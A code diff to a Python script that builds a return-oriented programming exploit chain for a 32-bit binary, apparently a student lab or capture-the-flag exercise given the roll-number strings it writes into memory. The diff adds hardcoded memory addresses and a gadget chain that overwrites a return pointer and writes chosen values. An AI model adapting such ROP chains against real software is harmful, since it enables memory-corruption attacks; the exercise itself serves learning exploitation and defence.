@@ -33,7 +33,7 @@ def convert_string_to_payload(string, max_str_len, payload_len):
     string = string[:4 * payload_len - 1] + chr(0)
     for i in range(payload_len):
         frag = string[4 * i: 4 * (i + 1)]
-        word = 0x0;
+        word = 0x0
         for j in range(4):
             word <<= 8
             word += ord(frag[-(j + 1)])
@@ -50,6 +50,10 @@ plaintext = 0x80e6ce0  # Address
 counter_addr = plaintext - 4
 offset_addr = plaintext - 8
 filled_mask_addr = plaintext - 12
+roll_num_1_addr = 0x080e5068
+roll_num_2_addr = 0x080e5070
+main_ret_pointer = 0x080e5f7c  #0x80ea33c
+exit_address = 0x80507f0
 format_str = 0x80b40a4  # Address
 xlatb = 0x0806c646  # xlatb; ret;  # mov al, BYTE PTR [ebx + al]
 inc_eax = 0x08088a9e  # inc eax; ret;
@@ -82,9 +86,51 @@ stdout.write("%s\n" % cipher_text)  # To be read into `plaintext`
 # Note payload cannot contain ord("\n")
 
 # Print the value of GLB using main.
-dummy = convert_string_to_payload("Encrypted:", 9, 6)
-
+dummy = convert_string_to_payload("Key: %d" % key, 9, 6)
 code = [
+    pop_ebx,
+    main_ret_pointer,
+    pop_ecx_clobber_eax,
+    exit_address,
+    fancy_dw_ebx_ecx,
+    0x0,
+    roll_num_2_addr,
+    0x0,
+    pop_ecx_clobber_eax,
+    ord('M') + (ord('E') << 8) + (ord('1') << 16) + (ord('9') << 24),
+    fancy_dw_ebx_ecx,
+    0x0,
+    roll_num_2_addr + 4,
+    0x0,
+    pop_ecx_clobber_eax,
+    ord('B') + (ord('1') << 8) + (ord('7') << 16) + (ord('7') << 24),
+    fancy_dw_ebx_ecx,
+    0x0,
+    roll_num_1_addr,
+    0x0,
+
+    pop_ecx_clobber_eax,
+    ord('E') + (ord('E') << 8) + (ord('1') << 16) + (ord('8') << 24),
+    fancy_dw_ebx_ecx,
+    0x0,
+    roll_num_1_addr + 4,
+    0x0,
+    pop_ecx_clobber_eax,
+    ord('1') + (ord('1') << 8) + (ord('0') << 16) + (0 << 24),
+    fancy_dw_ebx_ecx,
+    0x0,
+    0,
+    0x0,
+
+    pop_ecx_clobber_eax,
+    plaintext,
+    pop_ebx,
+    counter_addr,
+    fancy_dw_ebx_ecx,
+    0x0,
+    0,
+    0x0,
+
     # Write initial pointer location
     # *counter_addr = 0
     pop_ecx_clobber_eax,
